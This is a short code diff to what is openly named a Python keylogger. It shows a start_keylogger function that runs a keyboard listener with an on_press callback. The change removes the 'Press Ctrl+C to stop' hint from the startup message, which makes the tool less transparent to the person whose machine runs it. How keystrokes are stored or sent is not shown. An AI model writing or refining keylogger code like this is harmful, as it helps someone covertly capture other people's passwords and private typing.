@@ -20,5 +20,5 @@ def start_keylogger():
     with Listener(on_press=on_press) as listener:
         listener.join()
 if __name__ == "__main__":
-    print("Keylogger started... Press Ctrl+C to stop.")
+    print("Keylogger started...")
     start_keylogger()
